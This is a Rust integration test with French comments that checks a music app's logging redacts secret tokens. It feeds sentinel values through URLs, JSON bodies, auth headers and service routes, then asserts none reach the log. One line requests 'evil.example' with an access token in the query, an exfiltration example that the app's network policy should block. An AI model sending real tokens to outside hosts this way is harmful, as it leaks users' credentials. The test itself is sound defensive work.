//! Scénario complet : des jetons sentinelles passent par les chemins qui journalisent. Aucun ne doit rester dans le journal.

use bytes::Bytes;
use riff_core::core::{Core, CoreConfig};
use riff_core::logging::log_entry;
use riff_core::net::Http;
use riff_core::paths;
use riff_core::reply::{Method, Params};
use riff_core::secrets::{MemoryStore, SecretName, SecretStore};
use riff_core::services::{lastfm, spotify, translate};
use std::sync::Arc;

#[path = "support/temp.rs"]
mod temp;

const SENTINELS: [&str; 8] = [
  "SENTINEL-ACCESS",
  "SENTINEL-REFRESH",
  "SENTINEL-APIKEY",
  "SENTINEL-SECRET",
  "SENTINEL-CODE",
  "SENTINEL-TOKEN",
  "SENTINEL-DEEPL",
  "SENTINEL-SESSION",
];

#[tokio::test]
async fn no_token_or_key_reaches_the_log() {
  let root = temp::TempDir::new("log-redaction");
  std::fs::create_dir_all(root.join("data")).unwrap();
  // SAFETY : aucun autre fil n'existe encore dans ce binaire à un seul test.
  unsafe {
    std::env::set_var("RIFF_DATA_DIR", root.join("data"));
    std::env::set_var("LOCALAPPDATA", root.join("local"));
    std::env::set_var("XDG_CONFIG_HOME", root.join("xdg"));
    // macOS résout le dossier de config depuis le dossier personnel : jamais le vrai.
    #[cfg(unix)]
    std::env::set_var("HOME", root.join("home"));
    std::env::set_var("RIFF_NET_LOG", "1");
  }
  let store = Arc::new(MemoryStore::default());
  store
    .set(
      SecretName::SpotifyAuth,
      r#"{"clientId":"0123456789abcdef0123456789abcdef","refreshToken":"SENTINEL-REFRESH"}"#,
    )
    .unwrap();
  store.set(SecretName::DeeplKey, "SENTINEL-DEEPL").unwrap();
  store
    .set(SecretName::LastfmSession, "SENTINEL-SESSION")
    .unwrap();
  let core = Core::new(CoreConfig {
    local_base_url: "http://127.0.0.1:1".to_string(),
    secret_store: Some(store),
  });

  // Messages comme ceux que le code écrit réellement : URL, corps JSON, formulaire, en-tête, erreur réseau.
  log_entry(
    "ERROR",
    "GET https://api.example/x?access_token=SENTINEL-ACCESS&a=1",
  );
  log_entry(
    "ERROR",
    r#"body {"refresh_token":"SENTINEL-REFRESH","client_secret":"SENTINEL-SECRET"}"#,
  );
  log_entry(
    "ERROR",
    "grant_type=authorization_code&code=SENTINEL-CODE&client_id=abc",
  );
  log_entry("INFO", "Authorization: Bearer SENTINEL-TOKEN");
  log_entry(
    "INFO",
    "https://ws.audioscrobbler.com/2.0/?api_key=SENTINEL-APIKEY&token=SENTINEL-TOKEN",
  );
  log_entry(
    "WARN",
    "/api/audio-proxy?url=https%3A%2F%2Fh.example%2F%3Ftoken%3DSENTINEL-TOKEN",
  );
  let local = Http::local();
  if let Err(e) = local
    .get("http://127.0.0.1:9/?token=SENTINEL-TOKEN&api_key=SENTINEL-APIKEY")
    .send()
    .await
  {
    log_entry("ERROR", &format!("request failed: {e}"));
  }

  // Requêtes refusées par la politique, avec le registre réseau actif : aucune ne quitte la machine.
  let blocked = core
    .net
    .http_client
    .get("https://evil.example/?access_token=SENTINEL-ACCESS")
    .send()
    .await;
  log_entry("ERROR", &format!("{}", blocked.err().unwrap()));

  // Routes qui manipulent des jetons, sans réseau : réponses sans effet attendu ici, seul le journal compte.
  let body = Bytes::from_static(br#"{"texts":["x"],"targetLang":"fr","apiKey":"SENTINEL-DEEPL"}"#);
  let _ = translate::translate(
    &core,
    Params {
      body,
      ..Params::default()
    },
  )
  .await;
  let body = Bytes::from_static(br#"{"artist":"","track":"","sk":"SENTINEL-SESSION"}"#);
  let _ = lastfm::lastfm(
    &core,
    Method::Post,
    "/api/lastfm/scrobble",
    Params {
      body,
      ..Params::default()
    },
  )
  .await;
  let _ = spotify::status(&core).await;
  let _ = spotify::logout(&core).await;

  let log =
    std::fs::read_to_string(paths::log_path()).expect("le scénario a écrit dans le journal");
  assert!(log.lines().count() >= 8, "scénario trop court :\n{log}");
  for sentinel in SENTINELS {
    assert!(
      !log.contains(sentinel),
      "{sentinel} présent dans le journal :\n{log}"
    );
  }
}
